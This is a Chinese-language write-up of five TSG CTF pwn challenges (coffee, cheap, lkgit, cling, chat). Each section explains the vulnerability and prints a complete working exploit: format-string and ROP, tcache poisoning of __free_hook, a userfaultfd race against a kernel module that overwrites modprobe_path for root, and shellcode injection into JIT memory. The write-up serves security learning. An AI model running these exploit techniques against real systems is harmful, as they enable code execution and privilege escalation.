

### Coffee

```
// file
./coffee: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f06390409bc7bfd78cb08726dd89b4cd04d38f1a, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/tsgctf/coffee/coffee'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



透過 fmt leak libc 以及 overwrite puts@GOT 成 pop gadget，而後執行 ROP 來做 `scanf("%159s", printf_got-0x10)`，寫入 `"/bin/sh"` 字串 + overwrite printf@got 成 `system()` + 寫 `x` 成 0xc0ffee，最後執行 `printf(printf_got-0x10)` 即是執行 `system("/bin/sh")`。exploit：

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

r = process('./coffee')

pop_rsi_r15_ret = 0x401291 # pop rsi ; pop r15 ; ret (4199057)
pop_rbp_r12_r13_r14_r15_ret = 0x040128b # pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rbp_ret = 0x40117d # pop rbp ; ret
puts_plt = 0x401070 # (4198512)
puts_got = 0x404018 # (4210712)
printf_got = 0x404028
main_scanf = 0x4011be
x_addr = 0x404048

# 160 ==> 20 gadget
fmt = "%29$pAAA" # 5 + 3
fmt += f"%{ (pop_rbp_r12_r13_r14_r15_ret & 0xffff) - 17 }c%9$hnAAAAA" # 11 + 5
fmt = fmt.encode() + p64(puts_got)
### rop ###
fmt += p64(pop_rbp_ret) + p64(printf_got - 0x10 + 0xb0)
fmt += p64(pop_rsi_r15_ret) + p64(printf_got - 0x10) + p64(0)
fmt += p64(main_scanf)

r.sendline(fmt)
libc = int(r.recvuntil('AAA', drop=True), 16) - 0x270b3
_system = libc + 0x55410
info(f"libc: {hex(libc)}")

payload = b'/bin/sh\x00' + b'A'*8 # 0x404018
payload += p64(_system) # 0x404028
payload += b'A'*0x18 + p64(0xc0ffee)

r.sendline(payload)
r.interactive()
```



### cheap

```
// file
./cheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4b435b9cd30deea3e95e89b138f2f4cb02b0090b, for GNU/Linux 3.2.0, not stripped

// checksec
[*] '/home/u1f383/tsgctf/cheap/cheap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

單純的 heap 題，用 overlap 來做到 tcache poison：

```python
#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

r = process('./cheap')

def create(size, data):
    r.sendlineafter('Choice: ', '1')
    r.sendlineafter('size: ', str(size))
    r.sendlineafter('data: ', data)

def show():
    r.sendlineafter('Choice: ', '2')

def delete():
    r.sendlineafter('Choice: ', '3')

create(0x10, 'A')
delete()
create(0x20, 'B')
delete()
create(0x10, b'\x00'*0x18 + p64(0x421))
delete()
create(0x420-0x10-0x30 - 0x10, 'C')
create(0x70, p64(0) + p64(0x21) + p64(0)*0x3 + p64(0x21))
create(0x20, 'D')
delete()
show()
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
_system = libc + 0x55410
_free_hook = libc + 0x1eeb28
info(f"libc: {hex(libc)}")
create(0x20, 'E')
delete()
create(0x30, 'F')
delete()
create(0x20, b'\x00'*0x20 + p64(0) + p64(0x31))
delete()
create(0x30, 'G')
delete()
create(0x10, b'\x00'*0x50 + p64(_free_hook - 8) + p64(0))
create(0x20, 'H')
create(0x20, b'/bin/sh\x00' + p64(_system))
delete()
r.interactive()
```



### lkgit

實作了一個簡單的 git 在 kernel mode，不過在 function `lkgit_get_object()` 時有 race condition 的情況發生：

```c
static long save_object(hash_object *obj) {
    ...
    if((dup_ix = find_by_hash(obj->hash)) != -1) {
        kfree(objects[dup_ix]); // free
        objects[dup_ix] = NULL;
    }
    ...
}

static long lkgit_get_object(log_object *req) {
    ...
    if ((target_ix = find_by_hash(hash)) != -1) {
        target = objects[target_ix]; // put object in the stack
        
        // below 3 copy_to_user use "target" to get content
        // but it can be freed when req->content will trigger page fault
        if (copy_to_user(req->content, target->content, FILE_MAXSZ))
            goto end;

        get_hash(target->content, hash_other);
        if (memcmp(hash, hash_other, HASH_SIZE) != 0)
            goto end;

        if (copy_to_user(req->message, target->message, MESSAGE_MAXSZ))
            goto end;
        if (copy_to_user(req->hash, target->hash, HASH_SIZE))
            goto end;
        ret = 0;
    }
	...
}
```

我們能透過 `userfault()` 來註冊使用者自定義的 page fault handler，讓 race condition 的機率提高至 100%。在 race condition 發生的情況下，我們可以透過 spray 大小與 `log_object` 同為 0x20 的 `seq_operations`，而其中 `seq_operations` 內有指向 kernel code address 的 pointer，當資料回傳至 user space 時即可 leak kernel base。而 `seq_operations` 的 spray 方法為開啟多個 `/proc/self/stat` 檔案。

下一個階段要做的是 AAW 來寫 `modprobe_path`，分析後發現 function `lkgit_amend_message()` 也擁有 race condition 的情況發生：

```c
static long lkgit_amend_message(log_object *reqptr) {
    long ret = -LKGIT_ERR_OBJECT_NOTFOUND;
    char buf[MESSAGE_MAXSZ];
    log_object req = {0};
    int target_ix;
    hash_object *target;
    if(copy_from_user(&req, reqptr->hash, HASH_SIZE))
        goto end;

    if ((target_ix = find_by_hash(req.hash)) != -1) {
		target = objects[target_ix];
        // save message temporarily
        if (copy_from_user(buf, reqptr->message, MESSAGE_MAXSZ))
            goto end;
        ret = lkgit_get_object(reqptr);
        // amend message
        memcpy(target->message, buf, MESSAGE_MAXSZ);
    }

    end:
        return ret;
}
```

一旦存取 `reqptr->message` 時發生 page fault，我們就可以在 page fault 的過程中將 `target` 指向的位址 free 掉，並且在透過 spray `hash_object` 控制 `target->message` 偏移儲存的 pointer，這樣 `buf` 內部的值就會被寫到我們控制的位址。而 `buf` 的值從 `reqptr->message` 來，也是可以透過 page fault handler 來控制，因此我們將值寫成 `/tmp/pwn`，並將 **/tmp/pwn** 寫入調整 flag 權限的 shell script，這樣就可以用 user 的身份來讀 **flag**，做到提權。

exploit 如下：

```c
#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <poll.h>

#define CMD "#!/bin/sh\nchmod 777 /home/user/flag\n"

#define LKGIT_HASH_OBJECT         0xdead0001
#define LKGIT_AMEND_MESSAGE       0xdead0003
#define LKGIT_GET_OBJECT          0xdead0004

#define LKGIT_ERR_UNIMPLEMENTED   0xdead1000
#define LKGIT_ERR_OBJECT_NOTFOUND 0xdead1001
#define LKGIT_ERR_UNKNOWN         0xdead1100

#define FILE_MAXSZ                0x40
#define MESSAGE_MAXSZ             0x20
#define HISTORY_MAXSZ             0x30

#define HASH_SIZE                 0x10

typedef struct {
  char hash[HASH_SIZE];
  char *content;
  char *message;
} hash_object;

typedef struct {
  char hash[HASH_SIZE];
  char content[FILE_MAXSZ];
  char message[MESSAGE_MAXSZ];
} log_object;

unsigned long kernel_base = 0;
unsigned long modprobe_path = 0xe3cb20 - 0x200000;
int lkgit_fd;
char *addr;
hash_object hobj;

void hash_obj();
void get_obj();
void amend_msg();

void hash_obj()
{
    ioctl(lkgit_fd, LKGIT_HASH_OBJECT, &hobj);
}

void get_obj(log_object *lobj)
{
    ioctl(lkgit_fd, LKGIT_GET_OBJECT, lobj);
}

void amend_msg(log_object *lobj)
{
    ioctl(lkgit_fd, LKGIT_AMEND_MESSAGE, lobj);
}

void perr(const char *msg)
{
    puts(msg);
    exit(1);
}

void showgx(unsigned long *data, unsigned num)
{
    for (int i = 0; i < num; i += 8)
        printf("%02x\t%016lx\n", i, data[i/8]);
}

static int page_size;
int fds[0x80];

void *uf_handler(void *arg)
{
    static char *page = NULL;
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    struct uffdio_copy uffdio_copy;
    long uffd;

    uffd = (long) arg;
    if (page == NULL)
        page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
           perr("[-] uf_handler mmap failed");

    while (1)
    {
        struct pollfd pollfd;
        size_t nready;
        int nread;

        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);
        if (nready == -1)
            perr("[-] poll failed");

        nread = read(uffd, &msg, sizeof(msg));
        if (msg.event != UFFD_EVENT_PAGEFAULT)
            perr("[-] not a page fault event");
        printf("[*] trigger uf address: %llx\n", msg.arg.pagefault.address);

        // our pagefault handling
        switch (fault_cnt) {
            case 0:
                hash_obj(); // trigger kfree()
                // spray 0x20 seq_operations
                for (int i = 0; i < 0x80; i++)
                    fds[i] = open("/proc/self/stat", O_RDONLY);
                uffdio_copy.src = (unsigned long) page;
                break;
            case 1:
                hash_obj(); // trigger kfree
                // we want the kernel code in hash_obj:
                // message_buf = kzalloc(0x20, GFP_KERNEL)
                // get our freed chunk then we can fake target.message

                hobj.content = malloc(0x40);
                hobj.message = malloc(0x20);
                *((unsigned long *) hobj.message + 3) = modprobe_path;
                for (int i = 0; i < 0x40; i++) {
                    *(char *) hobj.content = i+1;
                    hash_obj();
                }
                char strbuf[0x1000] = {0};
                strcpy(strbuf, "/tmp/pwn");
                uffdio_copy.src = (unsigned long) strbuf;
        }

        // return to kernel
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                                  ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            perr("[-] uffd copy failed");
        printf("[*] uffdio_copy.copy returned %lld\n", uffdio_copy.copy);
        fault_cnt++;;
    }
}

void setup_uf(unsigned long base_addr, unsigned long size, unsigned offset)
{
    int tid;
    long uffd;
    pthread_t thr;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;

    // create new uffd
    page_size = sysconf(_SC_PAGE_SIZE);
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        perr("[-] create uffd failed");

    // enable uffd object
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        perr("[-] enable uffd failed");

    // allocate memory for uffd
    addr = (char *) mmap((void *) base_addr, size, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (addr == MAP_FAILED)
        perr("[-] mmap failed");
    printf("[+] mmap address = %p\n", addr);

    // register uffd
    uffdio_register.range.start = (unsigned long) addr + offset;
    uffdio_register.range.len = size;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        perr("[-] uffd register failed");

    // create monitor thread
    tid = pthread_create(&thr, NULL, uf_handler, (void *) uffd);
    if (tid != 0)
        perr("[-] create thread failed");
}
        
// 0xffffffffc0000000 - lkgit
int main()
{
    hobj.content = "TEST";
    log_object *lobj;

    // leak kernel base
    setup_uf(0x77770000, 0x4000, 0x1000);
    lkgit_fd = open("/dev/lkgit", O_RDWR);
    hobj.content = "TEST";
    hobj.message = "OWO";
    hash_obj();
    lobj = (log_object *) (addr + page_size - HASH_SIZE - FILE_MAXSZ);
    printf("[*] lobj point to: %p\n", lobj);
    getc(stdin);
    memcpy(lobj->hash, hobj.hash, HASH_SIZE);
    memcpy(lobj->content, hobj.content, FILE_MAXSZ);
    get_obj(lobj);
    showgx((unsigned long *) lobj, sizeof(log_object));
    kernel_base = *((unsigned long *) lobj) - 0x1adc20;
    printf("[+] kernel_base: 0x%016lx\n", kernel_base);
    modprobe_path += kernel_base;
    printf("[+] modprobe_path: 0x%016lx\n", modprobe_path);

    // AAW
    hobj.content = "QQ";
    hobj.message = "OWO";
    hash_obj();
    lobj = (log_object *) (addr + page_size*2 - HASH_SIZE - FILE_MAXSZ);
    printf("[*] lobj point to: %p\n", lobj);
    getc(stdin);
    memcpy(lobj->hash, hobj.hash, HASH_SIZE);
    memcpy(lobj->content, hobj.content, FILE_MAXSZ);
    amend_msg(lobj);

    // create /tmp/pwn
    int pwn_fd = open("/tmp/pwn", O_RDWR | O_CREAT);
    write(pwn_fd, CMD, strlen(CMD));
    close(pwn_fd);
    chmod("/tmp/pwn", 0777);

    // create /tmp/QQ
    int garbage_fd = open("/tmp/QQ", O_RDWR | O_CREAT);
    write(garbage_fd, "\xff\xff\xff\xff", 4);
    close(garbage_fd);
        chmod("/tmp/pwn", 0777);

    // trigger modprobe_path
    system("/tmp/QQ");
    return 0;
}
```

P.S. 關於 kernel 當中哪些 struct 可以利用，可以參考 ptr-yudai 的 [文章](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628)



### cling

cling 為 C interpreter，而餵入的 C source **chal.c** 內提供以下功能

1. 建立 buffer
2. 設定 buffer 的權限
3. 刪除 buffer
4. 定義簡易的 function
5. 執行 function

而漏洞存在於刪除 buffer 的 function：

```c
void del() {
    int ret = munmap(buf, 0x1000);
    if (ret == -1) {
        puts("fail");
        n_elem = 0;
        buf = NULL;
    }
}
```

雖然執行 `munmap()` 來釋放先前在 **create buf** 申請的記憶體區塊，但是並不會將 `buf` 設為 NULL。然而， cling 內部在處理使用者傳入的 function 時：

```c
...
sprintf(func, "unsigned long map_func(unsigned long x) {return %s;}", expr);
gCling->process(func);
...
```

會透過 `mmap()` 申請記憶體空間、使用 JIT 將 function code 轉成 asm insn，並且大小同樣為 **0x1000** (可以在 `mmap()` 下斷點得知)。若在先前有釋放相同大小的記憶體，會優先得到那塊記憶體，此時 `buf` 指向的記憶體區塊會與 `map_func()` 得到的相同，達成 memory overlap。因為能控制 page prot，因此我們的目標設置為執行任意 shellcode，可是我們不能很好地利用定義的 `map_func()` 來對現有的 asm 做操作，於是可以透過在 `munmap()` 一次此記憶體區塊，透過 **create buf** 在取得一樣的記憶體區塊，並且此時可以寫任意值到裡面：

```c
...
for (int i = 0; i < n_elem; i++) {
	if (scanf("%llu", &buf[i]) != 1) return;
}
...
```

於是透過 **gdb** 找到 function 進入點，將後續的 insn 改成 `execve("/bin/sh", NULL, NULL)` 即可，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process(['/bin/sh', '-c', 'cat ./chall.c - | ./cling/bin/cling'])

def create(size, elems):
    assert(size > 0 and size <= 0x200)
    r.sendlineafter("> ", '1')
    r.sendlineafter("size? >", str(size))
    for elem in elems:
        r.sendline(str(elem))

def protect(rr, w, x):
    rr = 'y' if rr else 'n'
    w = 'y' if w else 'n'
    x = 'y' if x else 'n'
    r.sendlineafter("> ", '2')
    r.sendlineafter('read? >', rr)
    r.sendlineafter('write? >', w)
    r.sendlineafter('exec? >', x)

def delete():
    r.sendlineafter("> ", '3')

def set_map(func):
    r.sendlineafter("> ", '4')
    r.sendlineafter('Give me your map function body > ', func)
    #r.recvuntil('map_func(42) = ')

def run_map(): # run with elems
    r.sendlineafter("> ", '5')

create(1, [1])
delete()
set_map('x+1')
delete()

shellcode = asm(shellcraft.sh())
shellcodes = [shellcode[i:i+8] for i in range(0, len(shellcode), 8)]
sc_u64 = []

for sc in shellcodes:
    sc_u64.append(u64(sc))

payload = [0x9090909090909090]*((0xa0 // 8) + 1) + sc_u64
create(len(payload), payload)
protect(True, True, True)
r.interactive()
```



### chat

參考： https://hackmd.io/@moratorium08/Sk7puL84Y

漏洞的成因在於 `stoull` 在遇到無法處理的大數時會觸發 exception，讓原本持有 `StringData` 的 variant `data` 變成沒有 value 的情況 (valueless)，使得在呼叫 `send_data()` 時存取 variant 發生 `terminate called after throwing an instance of 'std::bad_variant_access'` 的 exception 而 abort，最後結束 process。

我們可以建構一個 **host** 與 **client**，讓 **host** 觸發上述的 abort，而因為不正常離開 process，使得 destructor 並不會被呼叫，因此 **host** 所建立的 fifo 仍存在並未刪掉，但這造成如果 **host** 再次嘗試連線，依舊能夠連接成功，並且輸入的 `name` 還會透過 fifo 傳給 **client**，而若此時 **client** 呼叫 `receive_data()`，讀到的就是我們能控制的 **host** 所傳遞的 `name`，依序為： **type**、**length** 以及 **b64encoded_data**，但實際上 `StringData` 的 constructor 在讀取資料時並不會只讀我們傳遞的 **length** 數量的 data 而是全讀，造成出現**傳入資料的長度** (`len(data)`) 跟**傳入的長度資料** (**length**) 不 match 的情況，因此有 heap overflow：

```c
StringData(ifstream &ifs) {
    ifs >> length; // 
    char *b64_buf = (char *)malloc( 1 + (length+2)*2);
    ifs >> b64_buf;
    char *buf = (char *)malloc(length + 1);
    Base64decode(buf, b64_buf);
    buf[length] = 0;
    str = buf;
    free(b64_buf);
}
```



有了 heap overflow 後，下一步應該就會想辦法 leak libc / heap，並透過最簡單的 tcache poisoning 來改寫 `__free_hook`，然而 leak 有兩個需要考慮的地方：

1. 不論是從 stdin 或是 pipe 讀，在結尾的地方都會加上一個 NULL byte
2. 印出來時並非使用 `write` 而是只能印出字串的 `printf("%s")`

這導致沒辦法很直觀的透過讓 string 與殘留的 libc / haep 相接，並在印出或傳送時一同被送出，即使能 encode 包含 libc / heap 位址的資料，在 decode 後依舊無法印出來。然而，由於能夠重新連接上 pipe，並且題目在一開始時會將 pipe 內的資料作為對方的名字印出，因此如果能夠透過此方式接收到 base64 encode 後的資料，這樣就能透過自己來 decode，求得在其中的 libc / heap 位址。

上述為官方提供的解法，而做法二是透過 exception handler 會使用到 0x90 大小的 chunk，其中 0x30 offset 的位址會殘留 libc address，然而如果能將我們的 chunk 透過 overflow，設計到剛好與 chunk 0x30 的地方重疊，這樣在觸發 exception 時會將 libc 位址寫進 chunk，在透過 **host** 接收 libc address，而後就透過 tcache poisoning 做 exploit 即可，exploit 如下 (在我的 exploit 中，host 與 client 的立場與上方說明相反)：

```python
#!/usr/bin/python3

from pwn import *
import sys
from base64 import b64encode, b64decode

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

def set_data(sock, t, data, wait=True):
    sock.sendlineafter('> ', '1')
    sock.sendlineafter('type[int/str] >', t)
    sock.sendlineafter('data >', data)
    if wait:
        sock.recvuntil('Menu')

def send_data(sock, wait):
    sock.sendlineafter('> ', '2')
    if wait:
        sock.recvuntil('Menu')

def recv_data(sock, show=False):
    sock.sendlineafter('> ', '3')
    if show:
        print(sock.recvuntil('Menu', drop=True))

def get(name, is_host, wait):
    if is_host:
        r = process('./host')
    else:
        r = process('./client')
    r.sendlineafter("what's your name? >", name)
    if wait:
        r.recvuntil('connected...\n')
    return r

def crash(sock):
    set_data(sock, 'str', 'c')
    set_data(sock, 'int', str(0x10000000000000000000))
    send_data(sock, wait=False)
    sock.close()

def send(ff, tt, t, data):
    set_data(ff, t, data)
    send_data(ff, wait=True)
    recv_data(tt)

"""
when we use send_data to invoke client,
we send three datas (type, len, data)
"""
def aasend2h(h, data): # +2 datas
    c = get(data, is_host=False, wait=True) # get 1 data
    send_data(h, wait=True) # send 3 datas
    crash(c)

T_INT = 1
T_STR = 2

def way1():
    h = get('A', is_host=True, wait=False)
    c = get('B', is_host=False, wait=False)
    send(c, h, 'str', b'A'*0x208) # 0x210 (inuse), 0x420(0x415) -> unsortedbin
    crash(c)

    aasend2h(h, str(T_STR))
    aasend2h(h, str(0x410)) # will get 0x420 chunk, which in unsortedbin
    aasend2h(h, b64encode(b'OWO'))
    ## clear fifo with valid data ##
    tmp = get('2', is_host=False, wait=False)
    crash(tmp)
    tmp = get('1', is_host=False, wait=False)
    crash(tmp)
    tmp = get('A', is_host=False, wait=False)
    crash(tmp)
    tmp = get('2', is_host=False, wait=False)
    crash(tmp)
    tmp = get('1', is_host=False, wait=False)
    crash(tmp)

    ## last client need to hold the pipe ##
    c = get('B', is_host=False, wait=False)
    recv_data(h)
    send_data(h, wait=True)
    crash(c)

    ## clear fifo with valid data ##
    tmp = get('2', is_host=False, wait=True)
    crash(tmp)
    tmp = get('1', is_host=False, wait=True)
    crash(tmp)

    ## last client need to leak host libc ##
    leak = get('C', is_host=False, wait=True)
    data = leak.recvline()
    data = data.replace(b'The opponent is ', b'').replace(b'\n', b'')
    libc = u64(b64decode(data)[8:16]) - 0x1ebfd0
    __free_hook = libc + 0x1eeb28
    _system = libc + 0x55410
    info(f"libc: {hex(libc)}")

    ## clear fifo ##
    for _ in range(3):
        recv_data(h)

    send(h, leak, 'str', 'Q'*0x40)
    crash(leak)

    aasend2h(h, str(T_STR))
    aasend2h(h, str(0x210))
    aasend2h(h, b64encode(b'\x00'*0x218 + p64(0x21) + p64(__free_hook - 8))) # overwrite 0x20 fd
    recv_data(h)

    aasend2h(h, str(T_STR))
    aasend2h(h, str(0x1))
    aasend2h(h, b64encode(b'\x00'*8 + p64(_system)))
    recv_data(h)

    set_data(h, 'str', '/bin/sh')
    set_data(h, 'str', 'Q'*0x30, wait=False)

    h.interactive()

way1()
```

P.S. 若是透過 `receive_data` 接收資料，因為預期第一個接收到的參數會是 `type` (int)，因此在讀取時似乎沒有辦法好好讀傳入的 char array，這樣會影響到 host (透過 abort 來任意收資料) 以及 clinet (接收假資料來做 heap exploit)：

- host - 沒辦法用 `receive_data` 來清空 fifo，因為在輸入名字時會先把傳入的 type 吃掉，因此 `length` 與 `data` 會變成 `type` 以及 `length`，並且 `data` 為空
  - 解法為利用**接收名字**時是用 char array 來接收，因此可以 handle int 以及 char array
- client - 沒辦法用 `receive_data` 來清空 fifo ，因為 host 如果傳入的是任意名字，當在讀取 `type` 時就會不通過
  - 解法為讓 host 的名字傳入順序剛好符合 `type`、`length`、`data` 的格式

